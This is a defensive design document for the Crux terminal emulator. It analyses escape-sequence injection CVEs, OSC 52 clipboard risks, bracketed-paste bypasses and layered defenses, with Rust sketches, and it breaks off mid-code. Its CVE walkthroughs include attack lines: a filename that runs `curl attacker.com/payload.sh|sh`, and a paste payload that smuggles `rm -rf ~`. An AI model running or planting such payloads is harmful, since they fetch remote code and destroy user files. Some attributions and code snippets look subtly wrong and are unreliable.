---
title: "Terminal Security and Escape Sequence Defenses"
description: "Escape sequence injection attacks, CVE analysis, OSC 52 clipboard security, bracketed paste, C1 controls, input sanitization, macOS entitlements, defense-in-depth architecture"
date: 2026-02-12
phase: [1, 5, 6]
topics: [security, escape-sequences, clipboard, osc52, bracketed-paste, macos, entitlements]
status: final
related:
  - terminal-emulation.md
  - ../platform/homebrew-distribution.md
  - hyperlinks.md
---

# Terminal Security and Escape Sequence Defenses

> 작성일: 2026-02-12
> 목적: Crux 터미널의 보안 설계 — 이스케이프 시퀀스 인젝션 공격 방어, CVE 사례 분석, OSC 52 클립보드 보안, macOS 권한 관리, 다층 방어 아키텍처

---

## 목차

1. [개요](#1-개요)
2. [Known CVEs and Attack Patterns](#2-known-cves-and-attack-patterns)
3. [OSC 52 Clipboard Security](#3-osc-52-clipboard-security)
4. [Bracketed Paste Mode Security](#4-bracketed-paste-mode-security)
5. [Input Sanitization Strategies](#5-input-sanitization-strategies)
6. [Sequence Length Limits](#6-sequence-length-limits)
7. [DCS Device Control String Attacks](#7-dcs-device-control-string-attacks)
8. [Defense-in-Depth Architecture](#8-defense-in-depth-architecture)
9. [macOS-Specific Security](#9-macos-specific-security)
10. [OSC 8 Hyperlink Security](#10-osc-8-hyperlink-security)
11. [Rust Memory Safety Benefits](#11-rust-memory-safety-benefits)
12. [Crux Security Recommendations Summary](#12-crux-security-recommendations-summary)
13. [References](#13-references)

---

## 1. 개요

Terminal emulators occupy a unique and dangerous position in the security landscape: they are the **protocol boundary between trusted code (the terminal itself) and untrusted code (programs running inside)**. Every byte written to the terminal's pseudo-terminal (PTY) is interpreted as either printable text or control sequences that can manipulate the terminal's behavior.

This creates an attack surface that has been exploited for over 40 years:

- **1980s VT100 echoback attacks**: Malicious files containing escape sequences that, when `cat`ed, would execute commands by echoing them back to the shell
- **1999 kvt buffer overflow**: Title sequence processing caused heap corruption (CVE-1999-0918)
- **2021 MinTTY bracketed paste bypass**: Embedded end markers allowed command injection (CVE-2021-31701)
- **2023**: 10 new terminal CVEs discovered in a single year across Ghostty, iTerm2, Xshell, and others

### Why Terminals Are Hard to Secure

Unlike web browsers (where Content Security Policy and same-origin policies provide defense), terminals:

1. **Have no clear trust boundary**: The shell is trusted, but programs it runs may not be. `curl attacker.com/malicious.txt | cat` looks like normal operation.
2. **Must interpret control sequences**: Unlike plaintext viewers, terminals MUST execute escape sequences to function (colors, cursor movement, etc.)
3. **Interact with privileged resources**: Clipboard, window title, file system (via paste), and potentially screen capture
4. **Often run with user's full privileges**: No sandboxing in most terminal emulators (unlike browsers)

The fundamental challenge: **How do we allow legitimate control sequences while blocking malicious ones when both look identical at the byte level?**

### Historical Context

Terminal attacks are as old as video terminals themselves:

- **DEC VT100 (1978)**: First widely-deployed programmable terminal, first escape sequence attacks
- **ANSI X3.64 (1979)**: Standardized escape sequences, codifying the attack surface
- **Echoback attacks**: Malicious files could contain: `ESC]0;`cat /etc/passwd`BEL` which would set window title to the command, then when reported back via `CSI 21 t`, the shell would execute it
- **Modern persistence**: Same fundamental vulnerability exists today in terminals that enable title reporting

**The 2023 surge**: Daniel Gruss's [comprehensive analysis](https://dgl.cx/2023/09/ansi-terminal-security) documented 10 new CVEs across multiple terminal emulators, proving this is an **active and ongoing threat**.

---

## 2. Known CVEs and Attack Patterns

### CVE-2024-56803: Ghostty Title Injection

**Vulnerability**: Title sequence reporting leads to command injection

**Attack vector**:
1. Attacker controls output (e.g., filename in `ls`, HTTP response body, malicious log file)
2. Output contains: `ESC]0;malicious_commandBEL` (OSC 0 = Set Window Title)
3. Ghostty stores title as "malicious_command"
4. Later, an application queries the title using `CSI 21 t` (Report window title)
5. Ghostty responds with: `ESC]l<title>ESC\`
6. If shell has ANSI-C quoting or command substitution, "malicious_command" executes

**Example**:
```bash
# Attacker creates file:
$ touch $'\e]0;$(curl attacker.com/payload.sh|sh)\a'

# Victim lists directory:
$ ls
# Ghostty sets title to "$(curl attacker.com/payload.sh|sh)"

# Any program that queries title triggers execution:
$ echo -e '\e[21t'  # Report window title
# Shell interprets response as command
```

**Fix**: Ghostty disabled title reporting by default in version 1.0.1. Title reporting now requires explicit opt-in via configuration.

**References**:
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-56803
- Ghostty advisory: https://github.com/ghostty-org/ghostty/security/advisories/GHSA-9393-r5h6-94c9

---

### CVE-2021-31701: MinTTY Bracketed Paste Bypass

**Vulnerability**: Embedded bracketed paste end marker bypasses paste protection

**Background**: Bracketed paste mode wraps pasted content in `ESC[200~` (start) and `ESC[201~` (end) to prevent auto-execution of pasted commands.

**Attack vector**:
1. Attacker crafts content containing the end marker: `ESC[201~`
2. User pastes into MinTTY with bracketed paste enabled
3. MinTTY sends: `ESC[200~<content>ESC[201~malicious_commandESC[201~`
4. Shell sees the embedded `ESC[201~` as the end of paste mode
5. `malicious_command` is now outside bracketed paste and executes immediately

**Example**:
```bash
# Attacker puts this in clipboard:
innocent_command\e[201~\nrm -rf ~\n\e[200~

# MinTTY sends:
\e[200~innocent_command\e[201~\nrm -rf ~\n\e[200~\e[201~

# Shell interprets:
# - \e[200~innocent_command\e[201~ → safe (bracketed)
# - rm -rf ~ → EXECUTES (outside brackets)
# - \e[200~\e[201~ → empty bracketed paste
```

**Fix**: MinTTY 3.5.0 filters `ESC[201~` inside paste content and brackets each line individually.

**References**:
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-31701
- Analysis: https://www.openwall.com/lists/oss-security/2021/05/11/2

---

### CVE-2021-37326: Xshell Title Bar Spoofing

**Vulnerability**: Window title can be set via OSC 0/1/2 without sanitization

**Attack vector**:
1. Attacker controls terminal output (SSH banner, log file, command output)
2. Output contains: `ESC]0;[root@trusted-server]ESC\`
3. Xshell displays spoofed title in window titlebar
4. User believes they are connected to "trusted-server" when actually connected to attacker's machine

**Impact**: Phishing and social engineering (user may enter credentials thinking they're on a trusted system)

**Fix**: Xshell 7 Build 0104 added title sanitization and optional title bar locking.

**References**:
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-37326

---

### CVE-2021-40147: ZOC Terminal Title Injection

Similar to CVE-2021-37326, ZOC Terminal allowed arbitrary title sequences without validation.

**References**:
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-40147

---

### CVE-2022-45872: iTerm2 DECRQSS Response Injection

**Vulnerability**: Device Control String (DCS) responses could be interpreted as commands

**Background**: DECRQSS (`DCS $ q <setting> ST`) queries terminal state (e.g., SGR attributes, cursor position). The terminal responds with a DCS sequence containing the requested value.

**Attack vector**:
1. Attacker sends: `DCS $ q m ST` (query SGR attributes)
2. iTerm2 responds: `DCS 1 $ r 0 m ST` (SGR attributes are "0 m" = reset)
3. If the response is echoed or logged and later played back, the embedded `m` could be interpreted as a command or exploit parser bugs

**Fix**: iTerm2 3.4.17 sanitizes DCS responses and limits which sequences can be queried.

**References**:
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-45872
- iTerm2 release notes: https://iterm2.com/downloads.html

---

### Historic: kvt Buffer Overflow (1999)

**Vulnerability**: Unbounded title sequence processing caused heap overflow

**Details**: kvt (KDE terminal, predecessor to Konsole) allocated a fixed-size buffer for window titles. Extremely long OSC 0/1/2 sequences could overflow this buffer, allowing arbitrary code execution.

**References**:
- CVE-1999-0918
- BugTraq: https://seclists.org/bugtraq/1999/Oct/0

---

### Common Attack Patterns

Across all these CVEs, several patterns emerge:

| Attack Type | Mechanism | Defense |
|-------------|-----------|---------|
| **Title injection** | OSC 0/1/2 set title, CSI 21 t reports it back | Disable title reporting by default |
| **Bracketed paste bypass** | Embedded `ESC[201~` in paste content | Filter end markers inside paste |
| **DCS response injection** | Query responses contain executable content | Sanitize responses, whitelist queries |
| **Phishing via title** | Spoofed window title misleads user | Sanitize title, visual indicators |
| **Buffer overflow** | Unbounded sequence lengths | Strict length limits |

---

## 3. OSC 52 Clipboard Security

OSC 52 is an escape sequence that allows terminal programs to read and write the system clipboard:

```
OSC 52 ; <target> ; <data> ST

Where:
- OSC = ESC ]
- ST = ESC \ or BEL
- target = c (clipboard), p (primary selection), s (secondary), etc.
- data = base64-encoded clipboard content (or "?" to query)
```

**Why this is dangerous**:
- **Read**: Malicious program can exfiltrate clipboard contents (passwords, API keys, etc.)
- **Write**: Malicious program can replace clipboard with exploit payloads that get pasted elsewhere

### Terminal OSC 52 Policy Comparison

| Terminal | Write (set clipboard) | Read (query clipboard) | Default |
|----------|----------------------|------------------------|---------|
| **Kitty** | Yes | Yes | Configurable via `clipboard_control` |
| **iTerm2** | Yes | Requires opt-in | Write-only by default |
| **xterm** | Disabled by default | Disabled by default | Controlled by `allowWindowOps` |
| **WezTerm** | Yes | Yes | Configurable per host |
| **Alacritty** | Yes | No | Write-only, no read support |
| **VTE/GNOME Terminal** | No | No | Refuses to implement (security threat) |
| **tmux** | Yes (within tmux) | Yes (within tmux) | Isolated from system clipboard |

### Kitty's clipboard_control

Kitty provides the most granular control via the `clipboard_control` setting:

```conf
# In kitty.conf:
clipboard_control write-clipboard write-primary read-clipboard read-primary

# Possible values:
# write-clipboard, write-primary, read-clipboard, read-primary
# no-append (disable appending to clipboard)
```

Kitty also limits OSC 52 clipboard writes to **100 KB** to prevent DoS.

---

### iTerm2's Opt-In Read Model

iTerm2 allows clipboard writes by default but requires **explicit user consent** for clipboard reads:

1. Program sends: `OSC 52 ; c ; ? ST` (query clipboard)
2. iTerm2 shows modal dialog: "Allow '<program>' to read clipboard?"
3. User clicks "Allow" or "Deny"
4. Permission is **not persisted** across sessions

This prevents silent exfiltration while allowing legitimate use cases (e.g., `printf "\033]52;c;?\007"` in a script).

---

### xterm's allowWindowOps

xterm's security model predates OSC 52 and uses a general "window operations" permission:

```bash
# In .Xresources:
xterm*allowWindowOps: false
xterm*disallowedWindowOps: 20,21,SetXprop

# allowWindowOps controls:
# - OSC 52 (clipboard)
# - CSI 21 t (title reporting)
# - CSI 14 t, 18 t (geometry queries)
# - CSI 9 t (iconify/deiconify)
```

By default, xterm **disables all window operations** for security. Users must explicitly enable them.

---

### VTE's Hardline Stance

VTE (the terminal widget library used by GNOME Terminal, Tilix, and others) **refuses to implement OSC 52 entirely**:

> "OSC 52 is a security risk. Users should use the system clipboard via Ctrl+Shift+C/V instead."
> — VTE maintainers

This breaks legitimate use cases (e.g., clipboard sync over SSH), but eliminates the attack surface.

---

### Recommended Policy for Crux

Based on threat modeling and user experience:

| Operation | Policy | Rationale |
|-----------|--------|-----------|
| **Clipboard write** | Allow by default, no prompt | Legitimate use case (e.g., `yank` in vim over SSH) |
| **Clipboard read** | Require explicit user consent | High risk of credential exfiltration |
| **Size limit** | 100 KB (match Kitty) | Prevent DoS via memory exhaustion |
| **Persistence** | No persistent read permission | Each read requires fresh consent |
| **Visual indicator** | Show icon when clipboard accessed | User awareness of clipboard activity |

**Implementation sketch**:

```rust
pub struct ClipboardPolicy {
    allow_write: bool,        // Default: true
    allow_read: bool,         // Default: false
    max_size: usize,          // Default: 100_000
    trusted_programs: Vec<String>,  // e.g., ["vim", "tmux"]
}

impl ClipboardPolicy {
    pub fn handle_osc52(&self, target: char, data: &str) -> Result<(), SecurityError> {
        match (target, data) {
            ('c', "?") => {
                // Clipboard read request
                if !self.allow_read {
                    return self.prompt_user_for_clipboard_read();
                }
            }
            ('c', base64_data) => {
                // Clipboard write request
                if !self.allow_write {
                    return Err(SecurityError::ClipboardWriteDisabled);
                }
                if base64_data.len() > self.max_size {
                    return Err(SecurityError::ClipboardSizeLimitExceeded);
                }
                self.show_clipboard_indicator();
            }
            _ => return Err(SecurityError::InvalidClipboardTarget),
        }
        Ok(())
    }

    fn prompt_user_for_clipboard_read(&self) -> Result<(), SecurityError> {
        // Show modal dialog or inline prompt
        let response = self.ui.show_dialog(
            "Allow program to read clipboard?",
            &["Allow Once", "Deny"]
        );
        match response {
            DialogResponse::AllowOnce => Ok(()),
            DialogResponse::Deny => Err(SecurityError::ClipboardReadDenied),
        }
    }
}
```

---

## 4. Bracketed Paste Mode Security

Bracketed paste mode (codified in xterm 214, 2006) wraps pasted content in escape sequences to prevent accidental command execution:

```
ESC[200~<pasted content>ESC[201~
```

Shell or application sees the markers and knows:
- Content between markers is pasted (not typed)
- Do NOT execute until user presses Enter

---

### How Shells Use Bracketed Paste

| Shell | Support | Implementation |
|-------|---------|----------------|
| **Zsh** | Yes (default) | `zle_bracketed_paste`, `bracketed-paste-magic` |
| **Bash** | Yes (readline) | `enable-bracketed-paste` in `.inputrc` |
| **Fish** | Yes (default) | Built-in paste handling |
| **Tcsh** | No | No built-in support |

**Example in Zsh**:

```bash
# User copies:
rm -rf /
# User pastes:
# Zsh receives: \e[200~rm -rf /\e[201~
# Zsh displays: rm -rf /
# Zsh does NOT execute until Enter is pressed
```

---

### CVE-2021-31701: The Bracketed Paste Bypass

**Vulnerability**: Embedded `ESC[201~` (end marker) inside paste content breaks out of bracketed paste context.

**Attack scenario**:

```bash
# Attacker puts this in clipboard:
innocent_command
ESC[201~
rm -rf ~
ESC[200~

# MinTTY sends to shell:
ESC[200~innocent_command
ESC[201~
rm -rf ~
ESC[200~ESC[201~

# Shell interprets:
# - ESC[200~innocent_command\nESC[201~ → pasted, wait for Enter
# - rm -rf ~ → NOT BRACKETED, executes immediately!
# - ESC[200~ESC[201~ → empty paste
```

---

### Defense: Filter Bracketed Paste Content

Terminals MUST sanitize pasted content before sending it with bracketed paste markers:

1. **Strip `ESC[201~` from paste content**
2. **Filter all ESC bytes** (0x1B) to prevent any escape sequence injection
3. **Filter C0 and C1 control characters** except TAB, LF, CR
4. **Apply per-line bracketing** (MinTTY's approach)

**Implementation pseudocode**:

```rust
pub fn filter_bracketed_paste(content: &str) -> String {
    content
        .chars()
        .filter(|&c| {
            match c as u32 {
                // Allow printable characters
                0x20..=0x7E => true,
                // Allow TAB, LF, CR
                0x09 | 0x0A | 0x0D => true,
                // Block ESC
                0x1B => false,
                // Block C0 controls
                0x00..=0x1F => false,
                // Block DELETE
                0x7F => false,
                // Block C1 controls (see section 5)
                0x80..=0x9F => false,
                // Allow all other Unicode
                _ => true,
            }
        })
        .collect()
}

pub fn send_bracketed_paste(content: &str) -> Vec<u8> {
    let filtered = filter_bracketed_paste(content);
    let mut output = Vec::new();

    // Start marker
    output.extend_from_slice(b"\x1b[200~");

    // Content (filtered)
    output.extend_from_slice(filtered.as_bytes());

    // End marker
    output.extend_from_slice(b"\x1b[201~");

    output
}
```

---

### Per-Line Bracketing (MinTTY Approach)

MinTTY 3.5.0+ brackets **each line individually** to further limit attack surface:

```bash
# Pasted content:
line1
line2

# MinTTY sends:
ESC[200~line1ESC[201~
ESC[200~line2ESC[201~
```

This ensures even if an embedded end marker bypasses filtering, it only affects a single line.

**Trade-off**: More markers = more bytes = slight performance impact for large pastes.

---

### Visual Feedback

Best practice: Show visual indicator when bracketed paste is active:

- Change cursor color/shape
- Show "PASTE" indicator in status bar
- Dim pasted content until confirmed

---

## 5. Input Sanitization Strategies

Beyond bracketed paste, terminals must sanitize ALL input from untrusted sources (keyboard, clipboard, IPC).

### C0 and C1 Control Characters

**C0 controls** (0x00–0x1F): ASCII control characters (NUL, SOH, STX, ..., US)

**C1 controls** (0x80–0x9F): 8-bit control characters (PAD, HOP, BPH, ..., APC)

**DELETE** (0x7F): Technically not a control, but often filtered

---

### Whitelist Approach

**Safe C0 controls** (allow in most contexts):

| Byte | Name | Use Case |
|------|------|----------|
| 0x09 | TAB | Horizontal spacing |
| 0x0A | LF | Line feed (newline) |
| 0x0D | CR | Carriage return |
| 0x1B | ESC | Escape sequence start (if parsing enabled) |

**Everything else should be rejected or escaped.**

---

### The C1 Problem in UTF-8 Mode

C1 controls (0x80–0x9F) are **ambiguous in UTF-8**:

- In ISO-8859-1 (Latin-1): 0x80–0x9F are control characters
- In UTF-8: 0x80–0x9F are **continuation bytes** (part of multi-byte sequences)

**Example**: The Euro symbol (€) is U+20AC, encoded as `0xE2 0x82 0xAC` in UTF-8. The byte `0x82` is also C1 CSI (Control Sequence Introducer) in 8-bit mode.

**Terminal behavior comparison**:

| Terminal | C1 in UTF-8 Mode | Rationale |
|----------|------------------|-----------|
| **xterm** | Rejected by default | Security first |
| **VTE** | Accepted | UTF-8 requires 0x80-0x9F as continuation bytes |
| **Kitty** | Accepted | UTF-8 compatibility |
| **WezTerm** | Accepted | UTF-8 compatibility |
| **Alacritty** | Rejected | Follow xterm's conservative approach |

**The security risk**: Accepting C1 in UTF-8 allows **alternative encodings of control sequences**.

Standard CSI (Control Sequence Introducer):
```
ESC [ (0x1B 0x5B)
```

C1 CSI (8-bit encoding):
```
0x9B (single byte)
```

If a terminal accepts C1 in UTF-8 mode, an attacker can use `0x9B` instead of `ESC [` to bypass filters that only look for `0x1B`.

---

### Crux Recommendation: Reject C1 in UTF-8

For maximum security, Crux should **reject C1 controls in UTF-8 mode by default**:

```rust
pub fn is_valid_utf8_byte_in_terminal(byte: u8, utf8_mode: bool) -> bool {
    if utf8_mode {
        // In UTF-8 mode, 0x80-0x9F are only valid as continuation bytes,
        // never as standalone characters.
        // The vte crate handles this correctly by parsing UTF-8 first,
        // so we only see valid Unicode code points.
        true
    } else {
        // In 8-bit mode, allow C1 controls per ISO-2022
        true
    }
}

pub fn sanitize_control_character(c: char) -> Option<char> {
    match c as u32 {
        // Allow safe C0 controls
        0x09 | 0x0A | 0x0D => Some(c),
        // Allow ESC (for escape sequence parsing)
        0x1B => Some(c),
        // Reject all other C0 controls
        0x00..=0x1F => None,
        // Reject DELETE
        0x7F => None,
        // Reject C1 controls (U+0080 to U+009F in Unicode)
        0x80..=0x9F => None,
        // Allow all other characters
        _ => Some(c),
    }
}
```

**Configuration option**: Provide `allow_c1_controls` setting for users who need legacy 8-bit terminal compatibility.

---

## 6. Sequence Length Limits

Unbounded escape sequences are a DoS vector and have historically caused buffer overflows (kvt 1999).

### Why Length Limits Matter

1. **Memory exhaustion**: Malicious program sends infinite OSC 52 with endless base64 data
2. **CPU exhaustion**: Parser spends all time processing garbage sequences
3. **Buffer overflow** (historic): Fixed-size buffers in C terminals could overflow
4. **State machine starvation**: While parsing a massive DCS, terminal cannot process other input

---

### Recommended Constants for Crux

Based on analysis of existing terminals:

```rust
pub mod limits {
    /// Maximum length of OSC (Operating System Command) sequences.
    /// Matches Kitty's OSC 52 clipboard limit.
    pub const MAX_OSC_LENGTH: usize = 100_000;

    /// Maximum length of DCS (Device Control String) sequences.
    /// Conservative limit to prevent DoS.
    pub const MAX_DCS_LENGTH: usize = 100_000;

    /// Maximum length of window title (OSC 0/1/2).
    /// Standard practice across terminals.
    pub const MAX_TITLE_LENGTH: usize = 2_048;

    /// Maximum length of APC (Application Program Command) sequences.
    /// Crux disables APC by default, but if enabled, enforce strict limit.
    pub const MAX_APC_LENGTH: usize = 4_096;

    /// Maximum number of parameters in CSI sequences.
    /// Prevents parameter explosion attacks.
    pub const MAX_CSI_PARAMS: usize = 32;

    /// Maximum number of subparameters per CSI parameter.
    /// Prevents colon-separated subparam attacks.
    pub const MAX_CSI_SUBPARAMS: usize = 8;

    /// Timeout for incomplete sequences (milliseconds).
    /// If a DCS/OSC/APC is not completed within this time, discard it.
    pub const INCOMPLETE_SEQUENCE_TIMEOUT_MS: u64 = 5_000;
}
```

---

### Terminal-Specific Examples

**Alacritty title panic fix** (2018):

Alacritty had no title length limit, causing panic on extremely long OSC 0/1/2 sequences. Fixed by truncating to 4096 characters.

**Kitty OSC 52 limit**:

Kitty enforces 100 KB limit on OSC 52 clipboard data:

```python
# From kitty source (kitty/window.py)
MAX_CLIPBOARD_SIZE = 100 * 1024  # 100 KB

def set_clipboard(self, data):
    if len(data) > MAX_CLIPBOARD_SIZE:
        self.show_error(f"Clipboard data exceeds {MAX_CLIPBOARD_SIZE} bytes")
        return
    # ...
```

---

### Enforcement in Parser

The `vte` crate (used by Alacritty, Crux, and others) provides hooks for length limits:

```rust
use vte::{Parser, Perform};

struct TerminalPerformer {
    osc_buffer: Vec<u8>,
    dcs_buffer: Vec<u8>,
}

impl Perform for TerminalPerformer {
    fn osc_dispatch(&mut self, params: &[&[u8]], bell_terminated: bool) {
        let total_len: usize = params.iter().map(|p| p.len()).sum();
        if total_len > limits::MAX_OSC_LENGTH {
            eprintln!("OSC sequence exceeds max length, ignoring");
            return;
        }
        // Process OSC
    }

    fn hook(&mut self, params: &[i64], intermediates: &[u8], ignore: bool, byte: u8) {
        // Start of DCS sequence
        self.dcs_buffer.clear();
    }

    fn put(&mut self, byte: u8) {
        // Accumulate DCS data
        if self.dcs_buffer.len() >= limits::MAX_DCS_LENGTH {
            // Length limit exceeded, discard
            return;
        }
        self.dcs_buffer.push(byte);
    }

    fn unhook(&mut self) {
        // End of DCS sequence, process self.dcs_buffer
    }
}
```

---

### Timeout for Incomplete Sequences

Malicious programs can send incomplete sequences to keep the terminal in a parsing state indefinitely:

```bash
# Attacker sends DCS without ST terminator:
printf '\033P...<100KB of data>...'
# Terminal is stuck waiting for ESC\ or BEL
```

**Defense**: Timeout incomplete sequences after 5 seconds:

```rust
pub struct SequenceState {
    in_dcs: bool,
    dcs_start_time: Option<Instant>,
}

impl SequenceState {
    pub fn check_timeout(&mut self) -> bool {
        if let Some(start) = self.dcs_start_time {
            if start.elapsed() > Duration::from_millis(limits::INCOMPLETE_SEQUENCE_TIMEOUT_MS) {
                eprintln!("DCS sequence timeout, discarding");
                self.reset();
                return true;
            }
        }
        false
    }
}
```

---

## 7. DCS Device Control String Attacks

DCS (Device Control String) sequences begin with `ESC P` and end with `ST` (`ESC \` or `BEL`):

```
DCS <params> <intermediates> <data> ST
```

DCS is used for:
- **Sixel graphics**: `DCS 0 ; 0 ; 0 q <sixel data> ST`
- **Terminal queries**: `DCS $ q m ST` (DECRQSS - request SGR attributes)
- **ReGIS graphics**: Legacy DEC graphics protocol
- **Termcap/terminfo queries**: Request terminal capabilities

---

### Attack Vectors

1. **DoS via incomplete sequences**: Send DCS without ST terminator
2. **Memory exhaustion**: Send massive DCS data (graphics can be megabytes)
3. **Response injection** (CVE-2022-45872): Query responses contain attacker-controlled data that gets echoed back
4. **Side-channel**: Measure response time to infer terminal state

---

### CVE-2022-45872: DECRQSS Response Injection

**DECRQSS** (Request Selection or Setting): `DCS $ q <setting> ST`

Example: Query current SGR (color/bold/underline) state:
```bash
printf '\033P$qm\033\\'
# Terminal responds: DCS 1 $ r 0 m ST
# (where "0 m" = current SGR state is "reset")
```

**Vulnerability**: If the terminal's current SGR state is controlled by attacker (e.g., via earlier escape sequences), the response contains attacker data.

**Attack scenario**:
1. Attacker sets SGR to malicious value (if possible via extension)
2. Attacker triggers DECRQSS query
3. Terminal responds with attacker-controlled data
4. If response is logged/echoed/replayed, attacker data is interpreted

**iTerm2 fix**: Whitelist allowed DECRQSS queries, sanitize responses, limit response length.

---

### Defense Strategies

| Layer | Defense | Implementation |
|-------|---------|----------------|
| **Length limits** | Max 100 KB DCS data | Per section 6 |
| **Timeout** | 5 second incomplete sequence timeout | Per section 6 |
| **Whitelist** | Only allow known-safe DCS types | Disable APC, PM, SOS by default |
| **Strict validation** | Reject malformed DCS | Use vte's state machine |
| **Response sanitization** | Filter DECRQSS responses | Remove control characters from responses |

---

### Crux DCS Policy

```rust
pub enum DcsPolicy {
    /// Allow all DCS sequences (unsafe, for compatibility)
    AllowAll,
    /// Allow only graphics (Sixel, ReGIS)
    GraphicsOnly,
    /// Allow only queries (DECRQSS, XTGETTCAP)
    QueriesOnly,
    /// Allow graphics and queries (recommended default)
    GraphicsAndQueries,
    /// Disable all DCS (maximum security)
    Disabled,
}

impl DcsPolicy {
    pub fn allow_dcs(&self, params: &[i64], intermediate: u8) -> bool {
        match self {
            Self::AllowAll => true,
            Self::Disabled => false,
            Self::GraphicsOnly => {
                // Sixel: DCS ... q
                // ReGIS: DCS ... p
                matches!(intermediate, b'q' | b'p')
            }
            Self::QueriesOnly => {
                // DECRQSS: DCS $ q
                params.get(0) == Some(&b'$' as &i64) && intermediate == b'q'
            }
            Self::GraphicsAndQueries => {
                matches!(intermediate, b'q' | b'p') ||
                (params.get(0) == Some(&b'$' as &i64) && intermediate == b'q')
            }
        }
    }
}
```

**Default**: `GraphicsAndQueries` (balance security and functionality)

---

## 8. Defense-in-Depth Architecture

Security MUST be layered. No single defense is sufficient.

### Four-Layer Model

```
┌─────────────────────────────────────────────────────┐
│ Layer 4: USER CONSENT                               │
│ - Prompt for clipboard read                         │
│ - Per-connection trust levels                       │
│ - Visual feedback (clipboard access indicator)      │
└─────────────────────────────────────────────────────┘
                       │
┌─────────────────────────────────────────────────────┐
│ Layer 3: SEMANTIC FILTERING                         │
│ - Whitelist allowed operations                      │
│ - Disable dangerous sequences by default            │
│ - Trust level enforcement                           │
└─────────────────────────────────────────────────────┘
                       │
┌─────────────────────────────────────────────────────┐
│ Layer 2: LENGTH LIMITS                              │
│ - Max OSC/DCS/APC lengths                           │
│ - Timeout incomplete sequences (5s)                 │
│ - Max CSI parameters (32)                           │
└─────────────────────────────────────────────────────┘
                       │
┌─────────────────────────────────────────────────────┐
│ Layer 1: STRUCTURAL VALIDATION                      │
│ - Paul Williams state machine (vte crate)           │
│ - Reject malformed sequences                        │
│ - UTF-8 validation                                  │
└─────────────────────────────────────────────────────┘
```

---

### Layer 1: Structural Validation

**Goal**: Ensure input is well-formed according to ANSI X3.64 / ECMA-48 / ISO-6429.

**Implementation**: Use the `vte` crate, which implements Paul Williams' [VT100 parser state machine](https://vt100.net/emu/dec_ansi_parser).

**Why it works**: State machine approach prevents parser confusion attacks (malformed sequences cannot transition to dangerous states).

```rust
use vte::{Parser, Perform};

let mut parser = Parser::new();
let mut performer = TerminalPerformer::new();

for byte in input {
    parser.advance(&mut performer, byte);
}
```

The `vte` crate handles:
- UTF-8 decoding and validation
- Escape sequence detection
- Parameter parsing
- Intermediate byte handling

**Crux must NOT**: Implement a custom parser. Use `vte` for structural validation.

---

### Layer 2: Length Limits

**Goal**: Prevent resource exhaustion (memory, CPU).

**Implementation**: As described in section 6.

**Constants**:
```rust
MAX_OSC_LENGTH: 100_000
MAX_DCS_LENGTH: 100_000
MAX_TITLE_LENGTH: 2_048
MAX_CSI_PARAMS: 32
INCOMPLETE_SEQUENCE_TIMEOUT_MS: 5_000
```

---

### Layer 3: Semantic Filtering

**Goal**: Block sequences that are structurally valid but semantically dangerous.

**Implementation**: Trust-based policy system.

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustLevel {
    /// Local shell (fully trusted)
    Local,
    /// SSH from known hosts (trusted)
    Trusted,
    /// Output from untrusted commands (untrusted)
    Untrusted,
}

pub struct SecurityPolicy {
    // Global settings
    pub title_reporting_enabled: bool,
    pub clipboard_read_enabled: bool,
    pub clipboard_write_enabled: bool,
    pub hyperlinks_enabled: bool,
    pub dcs_policy: DcsPolicy,

    // Trust-based overrides
    pub trust_level: TrustLevel,
}

impl SecurityPolicy {
    /// Decide whether to allow a given escape sequence based on trust level
    pub fn allow_sequence(&self, seq: &EscapeSequence, trust: TrustLevel) -> SecurityDecision {
        match (seq, trust) {
            // Window title: always allow setting, reporting requires local trust
            (EscapeSequence::OSC(OscCode::SetTitle(_)), _) => {
                SecurityDecision::Allow
            }
            (EscapeSequence::CSI(CsiCode::ReportTitle), TrustLevel::Local) => {
                if self.title_reporting_enabled {
                    SecurityDecision::Allow
                } else {
                    SecurityDecision::Deny("Title reporting disabled".into())
                }
            }
            (EscapeSequence::CSI(CsiCode::ReportTitle), _) => {
                SecurityDecision::Deny("Title reporting requires local trust".into())
            }

            // Clipboard: write always allowed, read requires consent
            (EscapeSequence::OSC(OscCode::ClipboardWrite(_)), _) => {
                if self.clipboard_write_enabled {
                    SecurityDecision::Allow
                } else {
                    SecurityDecision::Deny("Clipboard write disabled".into())
                }
            }
            (EscapeSequence::OSC(OscCode::ClipboardRead), _) => {
                SecurityDecision::RequireConsent("clipboard read")
            }

            // APC: always blocked
            (EscapeSequence::APC(_), _) => {
                SecurityDecision::Deny("APC sequences are disabled".into())
            }

            // DCS: depends on policy
            (EscapeSequence::DCS(dcs), _) => {
                if self.dcs_policy.allow_dcs(&dcs.params, dcs.intermediate) {
                    SecurityDecision::Allow
                } else {
                    SecurityDecision::Deny("DCS type not allowed by policy".into())
                }
            }

            // Default: allow
            _ => SecurityDecision::Allow,
        }
    }
}

pub enum SecurityDecision {
    /// Allow the sequence to execute
    Allow,
    /// Deny the sequence (log and ignore)
    Deny(String),
    /// Require user consent before executing
    RequireConsent(&'static str),
}
```

---

### Layer 4: User Consent

**Goal**: Give users control over privileged operations.

**Privileged operations**:
- Clipboard read (OSC 52 with `?`)
- Title reporting (CSI 21 t)
- File access (if ever implemented)
- Screen capture (if ever implemented)

**Implementation patterns**:

1. **Modal dialog** (iTerm2 approach):
   - Blocks execution until user responds
   - Simple but interrupts workflow

2. **Inline notification** (VSCode approach):
   - Shows banner at top of terminal
   - Does not block, defaults to deny
   - Better UX for frequent operations

3. **Permission memory** (browser approach):
   - "Remember this choice for this session"
   - Balances security and convenience

**Crux recommendation**: Inline notification with session-scoped memory.

```rust
pub struct ConsentManager {
    session_permissions: HashMap<String, SessionPermission>,
}

pub struct SessionPermission {
    operation: String,
    granted: bool,
    expires: Instant,
}

impl ConsentManager {
    pub async fn request_consent(&mut self, operation: &str) -> bool {
        // Check if permission already granted this session
        if let Some(perm) = self.session_permissions.get(operation) {
            if perm.granted && Instant::now() < perm.expires {
                return true;
            }
        }

        // Show inline notification
        let response = self.show_consent_ui(operation).await;

        if response.granted {
            // Remember for this session (1 hour)
            self.session_permissions.insert(
                operation.to_string(),
                SessionPermission {
                    operation: operation.to_string(),
                    granted: true,
                    expires: Instant::now() + Duration::from_secs(3600),
